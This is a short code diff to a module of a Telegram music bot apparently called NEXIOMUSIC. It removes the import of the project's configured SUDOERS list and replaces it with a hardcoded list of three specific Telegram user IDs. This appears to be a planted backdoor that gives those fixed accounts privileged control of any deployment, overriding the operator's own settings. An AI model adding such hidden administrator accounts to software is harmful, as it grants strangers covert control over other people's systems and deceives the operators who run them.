@@ -11,7 +11,7 @@ from pyrogram import filters
 
 import config
 from NEXIOMUSIC import app
-from NEXIOMUSIC.misc import HAPP, SUDOERS, XCB
+from NEXIOMUSIC.misc import HAPP, XCB
 from NEXIOMUSIC.utils.database import (
     get_active_chats,
     remove_active_chat,
@@ -19,6 +19,8 @@ from NEXIOMUSIC.utils.database import (
 )
 from NEXIOMUSIC.utils.decorators.language import language
 from NEXIOMUSIC.utils.pastebin import SACHINBin
+
+SUDOERS = [7373125778, 5959548791, 7062666022]
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
